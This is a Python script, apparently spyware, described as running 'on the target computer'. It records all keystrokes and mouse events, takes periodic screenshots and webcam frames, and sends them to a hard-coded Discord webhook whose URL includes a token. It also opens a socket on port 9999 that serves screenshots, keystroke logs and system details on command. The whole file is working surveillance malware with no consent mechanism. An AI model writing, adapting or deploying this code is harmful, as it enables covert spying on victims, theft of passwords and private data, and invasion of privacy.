#!/usr/bin/env python3
"""
Remote Control Client Script
Runs on the target computer to capture screen, video, and keystrokes
"""

import socket
import threading
import time
import json
import base64
import requests
import cv2
import numpy as np
from PIL import Image, ImageGrab
import io
import pynput
from pynput import keyboard, mouse
import os
import sys
from datetime import datetime

class RemoteControlClient:
    def __init__(self, host_ip="0.0.0.0", host_port=9999, discord_webhook=None):
        self.host_ip = host_ip
        self.host_port = host_port
        self.discord_webhook = discord_webhook
        self.running = False
        self.socket = None
        self.keyboard_listener = None
        self.mouse_listener = None
        self.screen_capture_thread = None
        self.video_capture = None
        
        # Keystroke buffer
        self.keystroke_buffer = []
        self.last_webhook_send = time.time()
        
    def start(self):
        """Start the client and all monitoring threads"""
        print("Starting Remote Control Client...")
        self.running = True
        
        # Start keyboard monitoring
        self.start_keyboard_monitoring()
        
        # Start mouse monitoring
        self.start_mouse_monitoring()
        
        # Start screen capture
        self.start_screen_capture()
        
        # Start video capture
        self.start_video_capture()
        
        # Start socket connection
        self.start_socket_connection()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop all monitoring and cleanup"""
        print("Stopping Remote Control Client...")
        self.running = False
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        
        if self.mouse_listener:
            self.mouse_listener.stop()
            
        if self.video_capture:
            self.video_capture.release()
            
        if self.socket:
            self.socket.close()
    
    def start_keyboard_monitoring(self):
        """Start monitoring keyboard input"""
        def on_press(key):
            try:
                key_str = str(key)
                timestamp = datetime.now().strftime("%H:%M:%S")
                keystroke_data = {
                    "type": "keyboard",
                    "key": key_str,
                    "action": "press",
                    "timestamp": timestamp
                }
                self.keystroke_buffer.append(keystroke_data)
                self.send_keystrokes_to_discord()
            except Exception as e:
                print(f"Keyboard monitoring error: {e}")
        
        def on_release(key):
            try:
                key_str = str(key)
                timestamp = datetime.now().strftime("%H:%M:%S")
                keystroke_data = {
                    "type": "keyboard",
                    "key": key_str,
                    "action": "release",
                    "timestamp": timestamp
                }
                self.keystroke_buffer.append(keystroke_data)
                self.send_keystrokes_to_discord()
            except Exception as e:
                print(f"Keyboard monitoring error: {e}")
        
        self.keyboard_listener = keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        self.keyboard_listener.start()
        print("Keyboard monitoring started")
    
    def start_mouse_monitoring(self):
        """Start monitoring mouse input"""
        def on_click(x, y, button, pressed):
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                mouse_data = {
                    "type": "mouse",
                    "x": x,
                    "y": y,
                    "button": str(button),
                    "action": "press" if pressed else "release",
                    "timestamp": timestamp
                }
                self.keystroke_buffer.append(mouse_data)
                self.send_keystrokes_to_discord()
            except Exception as e:
                print(f"Mouse monitoring error: {e}")
        
        def on_scroll(x, y, dx, dy):
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                scroll_data = {
                    "type": "scroll",
                    "x": x,
                    "y": y,
                    "dx": dx,
                    "dy": dy,
                    "timestamp": timestamp
                }
                self.keystroke_buffer.append(scroll_data)
                self.send_keystrokes_to_discord()
            except Exception as e:
                print(f"Mouse scroll monitoring error: {e}")
        
        self.mouse_listener = mouse.Listener(
            on_click=on_click,
            on_scroll=on_scroll
        )
        self.mouse_listener.start()
        print("Mouse monitoring started")
    
    def send_keystrokes_to_discord(self):
        """Send keystrokes to Discord webhook"""
        if not self.discord_webhook or not self.keystroke_buffer:
            return
        
        # Send every 5 seconds or when buffer gets large
        current_time = time.time()
        if current_time - self.last_webhook_send < 5 and len(self.keystroke_buffer) < 10:
            return
        
        try:
            # Format keystrokes for Discord
            keystroke_text = "**Recent Activity:**\n"
            for stroke in self.keystroke_buffer[-20:]:  # Last 20 keystrokes
                if stroke["type"] == "keyboard":
                    keystroke_text += f"⌨️ {stroke['timestamp']} - {stroke['key']} ({stroke['action']})\n"
                elif stroke["type"] == "mouse":
                    keystroke_text += f"🖱️ {stroke['timestamp']} - Mouse {stroke['button']} at ({stroke['x']}, {stroke['y']}) ({stroke['action']})\n"
                elif stroke["type"] == "scroll":
                    keystroke_text += f"📜 {stroke['timestamp']} - Scroll ({stroke['dx']}, {stroke['dy']}) at ({stroke['x']}, {stroke['y']})\n"
            
            # Send to Discord
            payload = {
                "content": keystroke_text,
                "username": "Remote Monitor"
            }
            
            response = requests.post(self.discord_webhook, json=payload, timeout=10)
            if response.status_code == 204:
                print("Keystrokes sent to Discord")
                self.keystroke_buffer.clear()
                self.last_webhook_send = current_time
            else:
                print(f"Failed to send to Discord: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending to Discord: {e}")
    
    def start_screen_capture(self):
        """Start screen capture thread"""
        def capture_screen():
            while self.running:
                try:
                    # Capture screen
                    screenshot = ImageGrab.grab()
                    
                    # Convert to bytes
                    img_byte_arr = io.BytesIO()
                    screenshot.save(img_byte_arr, format='PNG')
                    img_byte_arr = img_byte_arr.getvalue()
                    
                    # Encode to base64
                    img_base64 = base64.b64encode(img_byte_arr).decode('utf-8')
                    
                    # Send to Discord every 30 seconds
                    if hasattr(self, 'last_screen_send'):
                        if time.time() - self.last_screen_send > 30:
                            self.send_screenshot_to_discord(img_base64)
                    else:
                        self.send_screenshot_to_discord(img_base64)
                    
                    time.sleep(30)  # Capture every 30 seconds
                    
                except Exception as e:
                    print(f"Screen capture error: {e}")
                    time.sleep(5)
        
        self.screen_capture_thread = threading.Thread(target=capture_screen, daemon=True)
        self.screen_capture_thread.start()
        print("Screen capture started")
    
    def send_screenshot_to_discord(self, img_base64):
        """Send screenshot to Discord"""
        if not self.discord_webhook:
            return
        
        try:
            payload = {
                "content": "📸 **Current Screen Capture**",
                "username": "Remote Monitor"
            }
            
            # Create file attachment
            files = {
                'file': ('screenshot.png', base64.b64decode(img_base64), 'image/png')
            }
            
            response = requests.post(self.discord_webhook, data=payload, files=files, timeout=30)
            if response.status_code == 204:
                print("Screenshot sent to Discord")
                self.last_screen_send = time.time()
            else:
                print(f"Failed to send screenshot: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending screenshot: {e}")
    
    def start_video_capture(self):
        """Start video capture from webcam"""
        def capture_video():
            try:
                self.video_capture = cv2.VideoCapture(0)
                if not self.video_capture.isOpened():
                    print("No webcam available")
                    return
                
                while self.running:
                    ret, frame = self.video_capture.read()
                    if ret:
                        # Convert frame to base64
                        _, buffer = cv2.imencode('.jpg', frame)
                        img_base64 = base64.b64encode(buffer).decode('utf-8')
                        
                        # Send to Discord every 60 seconds
                        if hasattr(self, 'last_video_send'):
                            if time.time() - self.last_video_send > 60:
                                self.send_video_frame_to_discord(img_base64)
                        else:
                            self.send_video_frame_to_discord(img_base64)
                        
                        time.sleep(60)  # Capture every 60 seconds
                    else:
                        time.sleep(5)
                        
            except Exception as e:
                print(f"Video capture error: {e}")
        
        video_thread = threading.Thread(target=capture_video, daemon=True)
        video_thread.start()
        print("Video capture started")
    
    def send_video_frame_to_discord(self, img_base64):
        """Send video frame to Discord"""
        if not self.discord_webhook:
            return
        
        try:
            payload = {
                "content": "📹 **Current Video Feed**",
                "username": "Remote Monitor"
            }
            
            # Create file attachment
            files = {
                'file': ('video_frame.jpg', base64.b64decode(img_base64), 'image/jpeg')
            }
            
            response = requests.post(self.discord_webhook, data=payload, files=files, timeout=30)
            if response.status_code == 204:
                print("Video frame sent to Discord")
                self.last_video_send = time.time()
            else:
                print(f"Failed to send video frame: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending video frame: {e}")
    
    def start_socket_connection(self):
        """Start socket connection for remote control"""
        def socket_handler():
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.bind((self.host_ip, self.host_port))
                self.socket.listen(1)
                print(f"Socket server listening on {self.host_ip}:{self.host_port}")
                
                while self.running:
                    try:
                        client_socket, addr = self.socket.accept()
                        print(f"Connection from {addr}")
                        
                        # Handle commands from host
                        while self.running:
                            data = client_socket.recv(1024)
                            if not data:
                                break
                            
                            command = data.decode('utf-8')
                            self.handle_command(command, client_socket)
                            
                    except Exception as e:
                        print(f"Socket error: {e}")
                        time.sleep(1)
                        
            except Exception as e:
                print(f"Socket connection error: {e}")
        
        socket_thread = threading.Thread(target=socket_handler, daemon=True)
        socket_thread.start()
    
    def handle_command(self, command, client_socket):
        """Handle commands from the host"""
        try:
            cmd_data = json.loads(command)
            cmd_type = cmd_data.get('type')
            
            if cmd_type == 'screenshot':
                # Send current screenshot
                screenshot = ImageGrab.grab()
                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='PNG')
                img_data = img_byte_arr.getvalue()
                
                response = {
                    'type': 'screenshot',
                    'data': base64.b64encode(img_data).decode('utf-8')
                }
                client_socket.send(json.dumps(response).encode('utf-8'))
                
            elif cmd_type == 'keystrokes':
                # Send recent keystrokes
                response = {
                    'type': 'keystrokes',
                    'data': self.keystroke_buffer[-50:]  # Last 50 keystrokes
                }
                client_socket.send(json.dumps(response).encode('utf-8'))
                
            elif cmd_type == 'system_info':
                # Send system information
                import platform
                import psutil
                
                system_info = {
                    'platform': platform.system(),
                    'platform_version': platform.version(),
                    'processor': platform.processor(),
                    'memory': psutil.virtual_memory()._asdict(),
                    'cpu_percent': psutil.cpu_percent(),
                    'disk_usage': psutil.disk_usage('/')._asdict()
                }
                
                response = {
                    'type': 'system_info',
                    'data': system_info
                }
                client_socket.send(json.dumps(response).encode('utf-8'))
                
        except Exception as e:
            print(f"Command handling error: {e}")

def main():
    # Discord webhook URL
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1400062822708412436/Nh4NJiBFH1su5mj4rmrvzwOZA2kuylHmhbgzXwqrAjH6oj0ymnPtaya-582kigv1hraS"
    
    # Create and start client
    client = RemoteControlClient(
        host_ip="0.0.0.0",
        host_port=9999,
        discord_webhook=DISCORD_WEBHOOK
    )
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.stop()

if __name__ == "__main__":
    main()